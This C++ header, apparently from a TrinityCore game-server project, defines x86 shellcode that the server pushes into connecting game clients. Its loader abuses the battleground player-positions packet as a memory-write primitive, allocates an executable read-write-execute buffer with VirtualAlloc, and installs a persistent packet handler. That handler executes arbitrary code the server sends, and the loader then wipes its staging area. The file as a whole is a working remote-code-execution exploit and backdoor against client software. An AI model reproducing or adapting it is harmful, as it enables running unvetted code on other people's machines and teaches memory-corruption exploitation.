/*
 * This file is part of the TrinityCore Project. See AUTHORS file for Copyright information
 *
 * This program is free software; you can redistribute it and/or modify it
 * under the terms of the GNU General Public License as published by the
 * Free Software Foundation; either version 2 of the License, or (at your
 * option) any later version.
 *
 * This program is distributed in the hope that it will be useful, but WITHOUT
 * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or
 * FITNESS FOR A PARTICULAR PURPOSE. See the GNU General Public License for
 * more details.
 *
 * You should have received a copy of the GNU General Public License along
 * with this program. If not, see <http://www.gnu.org/licenses/>.
 */

#ifndef WARDEN_PAYLOADS_H
#define WARDEN_PAYLOADS_H

#include "WardenWinDefines.h"
#include "ByteBuffer.h"

namespace WardenPayload
{
    // -----------------------------------------------------------------------
    // Loader shellcode sections.
    //
    // Must be assembled in declaration order; the two relative branches in
    // CheckCachedBuffer and CopyPayload assume this exact flat layout:
    //
    //   Offset  Section             Size
    //   ------  ------------------  ----
    //    0      Prologue              4
    //    4      RemoveBgHandler       7
    //   11      CheckCachedBuffer    10   <- jnz +0x2E targets RegisterHandler
    //   21      AllocRwxBuffer       20
    //   41      CacheBufferPtr        7
    //   48      CopyPayload          19   <- jnz -0x0E loops internally
    //   67      RegisterHandler      22   <- skip_alloc label
    //   89      JumpToFinalize        2
    //   ------  TOTAL                91   (padded to 96 for 8-byte alignment)
    // -----------------------------------------------------------------------
    struct Loader
    {
        // push ebp; mov ebp,esp; push ebx
        static constexpr auto Prologue = X86::PushEbp + X86::MovEbpEsp + X86::PushEbx;

        // mov eax, Va::BgPositionHandlerRemove; call eax
        static constexpr auto RemoveBgHandler = X86::MovEaxImm32 + LE32(Va::BgPositionHandlerRemove) + X86::CallEax;

        // mov ebx, [Va::PersistentSlot]; test ebx,ebx; jnz +Protocol::JnzSkipAllocOffset (-> RegisterHandler)
        static constexpr auto CheckCachedBuffer =
            X86::MovEbxMem32 + LE32(Va::PersistentSlot) +
            X86::TestEbxEbx + X86::Jnz + Imm8(Protocol::JnzSkipAllocOffset);

        // VirtualAlloc(NULL, Win32::RwxBufferSize, Win32::MemCommit, Win32::PageExecuteReadWrite)
        static constexpr auto AllocRwxBuffer =
            X86::PushImm8 + Imm8(Win32::PageExecuteReadWrite) +
            X86::PushImm32 + LE32(Win32::MemCommit) +
            X86::PushImm32 + LE32(Win32::RwxBufferSize) +
            X86::PushZero + X86::CallMem32 + LE32(Va::VirtualAllocIAT);

        // mov ebx, eax; mov [Va::PersistentSlot], eax
        static constexpr auto CacheBufferPtr = X86::MovEbxEax + X86::StoreEaxMem32 + LE32(Va::PersistentSlot);

        // mov edx, PayloadCopySrc
        // loop: mov ch,[edx]; mov [eax],ch; inc edx; inc eax; cmp edx,PayloadCopySrcEnd; jnz loop
        static constexpr auto CopyPayload =
            X86::MovEdxImm32 + LE32(Va::PayloadCopySrc) +
            X86::MovChEdxPtr + X86::MovEaxPtrCh + X86::IncEdx + X86::IncEax +
            X86::CmpEdxImm32 + LE32(Va::PayloadCopySrcEnd) + X86::Jnz + Imm8(Protocol::JnzLoopBackOffset);

        // skip_alloc: mov eax,ebx; add eax,HandlerEntryOffset; push eax(x2); push opcode;
        // mov eax, Va::RegisterPacketHandler; call eax; add esp,0x0C
        static constexpr auto RegisterHandler =
            X86::MovEaxEbx + X86::AddEaxImm8 + Imm8(Protocol::HandlerEntryOffset) +
            X86::PushEax + X86::PushEax + X86::PushImm32 + LE32(Protocol::CustomHandlerOpcode) +
            X86::MovEaxImm32 + LE32(Va::RegisterPacketHandler) +
            X86::CallEax + X86::AddEspImm8 + Imm8(Protocol::CdeclThreeArgCleanup);

        // jmp ebx
        static constexpr auto JumpToFinalize = X86::JmpEbx;
    };

    // -----------------------------------------------------------------------
    // Handler payload sections.
    //
    // Written into the persistent RWX buffer by the loader's copy loop.
    // The two logical parts must remain contiguous and in declaration order:
    //
    //   Buffer offset  Section             Size  Purpose
    //   -------------  ------------------  ----  -------------------------------
    //   0x00           WipeStagingArea      22 }
    //   0x16           SetReturnValue        5 } Finalization stub (32 bytes)
    //   0x1B           FinalizeEpilogue      5 }
    //   0x20           HandlerPrologue       5 }
    //   0x25           GetCodePointer        6 }
    //   0x2B           CallHelperA          12 }
    //   0x37           CallHelperB          12 } Packet handler (62 bytes)
    //   0x43           CallBufferAlloc       8 }
    //   0x4B           CallDispatch          7 }
    //   0x52           ExecuteServerCode     6 }
    //   0x58           HandlerEpilogue       6 }
    //   -------------  TOTAL                94
    // -----------------------------------------------------------------------
    struct Handler
    {
        // ---- Part 1: Finalization stub (buffer offset 0x00, 32 bytes) --------
        // Reached exactly once, via jmp ebx at the end of the loader.
        // Runs from the RWX buffer so it can safely wipe Va::StagingBase.

        // push RwxBufferSize; push 0; push Va::StagingBase;
        // mov eax, Va::MemsetRoutine; call eax; add esp, 0x0C
        static constexpr auto WipeStagingArea =
            X86::PushImm32 + LE32(Win32::RwxBufferSize) + X86::PushZero +
            X86::PushImm32 + LE32(Va::StagingBase) +
            X86::MovEaxImm32 + LE32(Va::MemsetRoutine) +
            X86::CallEax + X86::AddEspImm8 + Imm8(Protocol::CdeclThreeArgCleanup);

        // mov eax, Va::AccountName
        static constexpr auto SetReturnValue = X86::MovEaxImm32 + LE32(Va::AccountName);

        // pop ebx; mov esp,ebp; pop ebp; ret
        static constexpr auto FinalizeEpilogue = X86::PopEbx + X86::MovEspEbp + X86::PopEbp + X86::Ret;

        // ---- Part 2: Packet handler (buffer offset 0x20, 62 bytes) ----------
        // Called by the network dispatcher for every Protocol::CustomHandlerOpcode packet.
        // Dispatcher calling convention:
        //   [ebp+Protocol::PacketArgEbpOffset]   = packet buffer pointer
        //   [ebp+Protocol::ContextArgEbpOffset]  = dispatcher context object (used as `this`)

        // push ebp; mov ebp,esp; push ebx; push edi
        static constexpr auto HandlerPrologue = X86::PushEbp + X86::MovEbpEsp + X86::PushEbx + X86::PushEdi;

        // mov ebx, [ebp+PacketArgEbpOffset]; add ebx, Protocol::PacketCodeOffset
        static constexpr auto GetCodePointer =
            X86::MovEbxEbpOff + Imm8(Protocol::PacketArgEbpOffset) +
            X86::AddEbxImm8 + Imm8(Protocol::PacketCodeOffset);

        // mov ecx, [ebp+ContextArgEbpOffset]; mov eax, Va::HandlerContextGetter; call eax; mov edi, eax
        static constexpr auto CallHelperA =
            X86::MovEcxEbpOff + Imm8(Protocol::ContextArgEbpOffset) +
            X86::MovEaxImm32 + LE32(Va::HandlerContextGetter) + X86::CallEax + X86::MovEdiEax;

        // mov ecx, [ebp+ContextArgEbpOffset]; push edi; push ebx; mov eax, Va::HandlerBufferPrepare; call eax
        static constexpr auto CallHelperB =
            X86::MovEcxEbpOff + Imm8(Protocol::ContextArgEbpOffset) +
            X86::PushEdi + X86::PushEbx + X86::MovEaxImm32 + LE32(Va::HandlerBufferPrepare) + X86::CallEax;

        // push edi; push ebx; call [Va::HandlerBufferAllocIAT]
        static constexpr auto CallBufferAlloc = X86::PushEdi + X86::PushEbx + X86::CallMem32 + LE32(Va::HandlerBufferAllocIAT);

        // push eax; call [Va::HandlerDispatchIAT]
        static constexpr auto CallDispatch = X86::PushEax + X86::CallMem32 + LE32(Va::HandlerDispatchIAT);

        // mov ecx, [ebp+ContextArgEbpOffset]; push ecx; call ebx
        static constexpr auto ExecuteServerCode = X86::MovEcxEbpOff + Imm8(Protocol::ContextArgEbpOffset) + X86::PushEcx + X86::CallEbx;

        // pop edi; pop ebx; mov esp,ebp; pop ebp; ret
        static constexpr auto HandlerEpilogue = X86::PopEdi + X86::PopEbx + X86::MovEspEbp + X86::PopEbp + X86::Ret;
    };

    // Verify the finalization stub occupies exactly Protocol::HandlerEntryOffset bytes so the
    // packet handler entry point lands at the expected buffer offset.
    static_assert(
        sizeof(Handler::WipeStagingArea) +
        sizeof(Handler::SetReturnValue) +
        sizeof(Handler::FinalizeEpilogue) == Protocol::HandlerEntryOffset,
        "Finalization stub must be exactly HandlerEntryOffset bytes"
    );

    // Verify the full handler payload matches the staging area reserved for it.
    static_assert(
        sizeof(Handler::WipeStagingArea) +
        sizeof(Handler::SetReturnValue) +
        sizeof(Handler::FinalizeEpilogue) +
        sizeof(Handler::HandlerPrologue) +
        sizeof(Handler::GetCodePointer) +
        sizeof(Handler::CallHelperA) +
        sizeof(Handler::CallHelperB) +
        sizeof(Handler::CallBufferAlloc) +
        sizeof(Handler::CallDispatch) +
        sizeof(Handler::ExecuteServerCode) +
        sizeof(Handler::HandlerEpilogue) == Va::PayloadCopySrcEnd - Va::PayloadCopySrc,
        "Handler payload size must match the staging area range [PayloadCopySrc, PayloadCopySrcEnd)"
    );

    // Fills `out` with the MSG_BATTLEGROUND_PLAYER_POSITIONS packet body that
    // stages the loader shellcode and handler payload into client memory via the
    // BG-positions write-primitive.  Caller wraps this in a WorldPacket and sends it.
    void BuildShellcodeInstaller(ByteBuffer& out);
}

#endif // WARDEN_PAYLOADS_H
